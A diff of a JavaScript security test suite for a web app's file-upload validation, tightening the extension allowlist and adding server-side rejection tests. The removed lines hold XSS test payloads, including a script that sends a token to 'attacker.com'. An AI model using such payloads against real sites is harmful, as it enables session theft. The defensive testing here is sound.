@@ -11,8 +11,8 @@ function assert(condition, message) {
     console.log("PASS: " + message);
 }
 
-// Logic replicate from public-action-page.js for unit testing validation engine
-const ALLOWED_EXTENSIONS = ['pdf', 'docx', 'xlsx', 'csv', 'png', 'jpg', 'jpeg', 'zip', 'txt'];
+// Reconciled Canonical 8 Formats from Frozen Architecture Contract
+const ALLOWED_EXTENSIONS = ['pdf', 'png', 'jpg', 'jpeg', 'docx', 'xlsx', 'zip', 'csv'];
 const FORBIDDEN_EXTENSIONS = ['exe', 'bat', 'cmd', 'sh', 'js', 'py', 'vbs', 'php', 'jar', 'msi', 'bin', 'dll'];
 const MAX_FILES = 5;
 const MAX_FILE_SIZE_BYTES = 25 * 1024 * 1024; // 25 MB
@@ -28,7 +28,7 @@ function validateFiles(files) {
             return { valid: false, error: `Файл «${f.name}» має заборонений формат (.${ext}).` };
         }
         if (!ALLOWED_EXTENSIONS.includes(ext)) {
-            return { valid: false, error: `Формат файлу «${f.name}» не підтримується.` };
+            return { valid: false, error: `Формат файлу «${f.name}» не підтримується. Дозволено: ${ALLOWED_EXTENSIONS.join(', ')}.` };
         }
         if (f.size > MAX_FILE_SIZE_BYTES) {
             return { valid: false, error: `Файл «${f.name}» перевищує ліміт 25 MB.` };
@@ -56,8 +56,22 @@ async function run() {
 
     try {
         // 1. File Restrictions Validation
-        console.log("1. Testing File Count, Size & Extension Restrictions...");
+        console.log("1. Testing File Count, Size & Reconciled 8-Extension Allowlist...");
         
+        // Canonical 8 extensions tested individually
+        for (const ext of ['pdf', 'png', 'jpg', 'jpeg', 'docx', 'xlsx', 'zip', 'csv']) {
+            const check = validateFiles([{ name: `document.${ext}`, size: 5000 }]);
+            assert(check.valid === true, `Canonical extension .${ext} accepted`);
+        }
+
+        // Explicit check: .jpeg is accepted
+        const jpegCheck = validateFiles([{ name: "photo_scan.jpeg", size: 20480 }]);
+        assert(jpegCheck.valid === true, "Explicit check: .jpeg is accepted");
+
+        // Explicit check: .txt is rejected as attachment (text responses are submitted via text input)
+        const txtCheck = validateFiles([{ name: "notes.txt", size: 1024 }]);
+        assert(txtCheck.valid === false && txtCheck.error.includes("не підтримується"), "Explicit check: .txt is rejected as attachment file");
+
         // Max files <= 5
         const valid5 = validateFiles([
             { name: "f1.pdf", size: 1000 },
@@ -74,7 +88,7 @@ async function run() {
             { name: "f3.xlsx", size: 1000 },
             { name: "f4.png", size: 1000 },
             { name: "f5.zip", size: 1000 },
-            { name: "f6.txt", size: 1000 }
+            { name: "f6.csv", size: 1000 }
         ]);
         assert(invalid6.valid === false && invalid6.error.includes("Максимальна кількість файлів"), ">5 files rejected");
 
@@ -111,24 +125,24 @@ async function run() {
             assert(escaped.includes('&lt;') || escaped.includes('&gt;') || escaped.includes('&quot;'), "XSS special chars escaped");
         }
 
-        // 3. Database Injection and Sanitization verification with XSS in task title / client payload
-        console.log("3. Testing DB Persistence and Safe Retrieval of User Inputs...");
+        // 3. Database Server-Side Validation Verification
+        console.log("3. Testing DB Authoritative Server-Side Validation...");
         const ownerRes = await pool.query("SELECT id FROM public.profiles WHERE global_role = 'owner' LIMIT 1");
         const ownerId = ownerRes.rows[0].id;
 
-        const orgRes = await pool.query("INSERT INTO public.organizations (name, status) VALUES ('Org XSS Test', 'active') RETURNING id");
+        const orgRes = await pool.query("INSERT INTO public.organizations (name, status) VALUES ('Org Reconcile Test', 'active') RETURNING id");
         const orgId = orgRes.rows[0].id;
         createdOrgIds.push(orgId);
 
         const pRes = await pool.query(
-            "INSERT INTO public.projects (organization_id, name, status, title) VALUES ($1, 'Project <script>alert(1)</script>', 'active', 'Project Title') RETURNING id",
+            "INSERT INTO public.projects (organization_id, name, status, title) VALUES ($1, 'Project Validation', 'active', 'Project Title') RETURNING id",
             [orgId]
         );
         const projectId = pRes.rows[0].id;
         createdProjectIds.push(projectId);
 
         const tRes = await pool.query(
-            "INSERT INTO public.tasks (organization_id, project_id, title, description, status, responsibility_type, is_client_visible) VALUES ($1, $2, 'Task <img src=x onerror=alert(1)>', 'Desc <b>alert</b>', 'todo', 'client', true) RETURNING id",
+            "INSERT INTO public.tasks (organization_id, project_id, title, description, status, responsibility_type, is_client_visible) VALUES ($1, $2, 'Task For Validation', 'Desc', 'todo', 'client', true) RETURNING id",
             [orgId, projectId]
         );
         const taskId = tRes.rows[0].id;
@@ -141,29 +155,71 @@ async function run() {
         `);
         const token = gRes[gRes.length - 1].rows[0].res;
 
-        const publicData = await pool.query("SELECT public.get_public_client_action($1) AS res", [token.raw_token]);
-        const pData = publicData.rows[0].res;
+        // Server-Side Rejection 1: Invalid extension (.exe) in attachments
+        let serverExeBlocked = false;
+        try {
+            await pool.query("SELECT public.submit_public_client_action($1, $2)", [
+                token.raw_token,
+                JSON.stringify({
+                    text: "Trying invalid file",
+                    attachments: [{ name: "evil.exe", size: 1024, type: "application/x-msdownload" }]
+                })
+            ]);
+        } catch(e) {
+            serverExeBlocked = true;
+            assert(e.message.includes("File format of evil.exe is not allowed"), "Server rejected non-allowlisted format evil.exe");
+        }
+        assert(serverExeBlocked, "Server-side authoritative validation blocked .exe file");
 
-        // Verify Data Minimization
-        assert(pData.organization_id === undefined, "organization_id hidden in public response");
-        assert(pData.project_id === undefined, "project_id hidden in public response");
-        assert(pData.task_id === undefined, "task_id hidden in public response");
-        assert(pData.raw_token === undefined, "raw_token hidden in public response");
+        // Server-Side Rejection 2: .txt file rejected on server
+        let serverTxtBlocked = false;
+        try {
+            await pool.query("SELECT public.submit_public_client_action($1, $2)", [
+                token.raw_token,
+                JSON.stringify({
+                    text: "Trying txt file",
+                    attachments: [{ name: "notes.txt", size: 1024, type: "text/plain" }]
+                })
+            ]);
+        } catch(e) {
+            serverTxtBlocked = true;
+            assert(e.message.includes("File format of notes.txt is not allowed"), "Server rejected non-allowlisted format notes.txt");
+        }
+        assert(serverTxtBlocked, "Server-side authoritative validation blocked .txt file");
 
-        // Submit XSS payload
-        const xssPayload = {
-            text: "<script>document.location='http://attacker.com/steal?token='</script>",
-            attachments: [
-                { name: "<svg onload=alert(1)>.pdf", size: 1024, type: "application/pdf" }
-            ]
-        };
+        // Server-Side Rejection 3: More than 5 files on server
+        let server6FilesBlocked = false;
+        try {
+            await pool.query("SELECT public.submit_public_client_action($1, $2)", [
+                token.raw_token,
+                JSON.stringify({
+                    text: "Trying 6 files",
+                    attachments: [
+                        { name: "1.pdf", size: 100 }, { name: "2.pdf", size: 100 },
+                        { name: "3.pdf", size: 100 }, { name: "4.pdf", size: 100 },
+                        { name: "5.pdf", size: 100 }, { name: "6.pdf", size: 100 }
+                    ]
+                })
+            ]);
+        } catch(e) {
+            server6FilesBlocked = true;
+            assert(e.message.includes("maximum 5 files allowed"), "Server rejected >5 files");
+        }
+        assert(server6FilesBlocked, "Server-side authoritative validation blocked >5 files");
 
-        const subRes = await pool.query("SELECT public.submit_public_client_action($1, $2) AS res", [token.raw_token, JSON.stringify(xssPayload)]);
-        assert(subRes.rows[0].res.success === true, "Submission with XSS payload stored safely without crashing DB");
-
-        const subCheck = await pool.query("SELECT payload, attachments FROM public.task_submissions WHERE task_id = $1", [taskId]);
-        assert(subCheck.rows[0].payload.text.includes("<script>"), "Payload stored as raw data (safe parameterized JSONB)");
-        assert(escapeHtml(subCheck.rows[0].payload.text).includes("&lt;script&gt;"), "Client-side escapeHtml prevents rendering dangerous script tags");
+        // Server-Side Success: Valid canonical attachments (.pdf, .jpeg, .xlsx)
+        const validSubmit = await pool.query("SELECT public.submit_public_client_action($1, $2) AS res", [
+            token.raw_token,
+            JSON.stringify({
+                text: "Legitimate client submission",
+                attachments: [
+                    { name: "scan.jpeg", size: 50000, type: "image/jpeg" },
+                    { name: "financials.xlsx", size: 100000, type: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" },
+                    { name: "brief.pdf", size: 200000, type: "application/pdf" }
+                ]
+            })
+        ]);
+        assert(validSubmit.rows[0].res.success === true, "Server-side authoritative validation accepted canonical files (.jpeg, .xlsx, .pdf)");
 
         console.log("PASS: Phase 6D.2 File Validation & Security Guard Suite passed 100%!");
     } catch(e) {
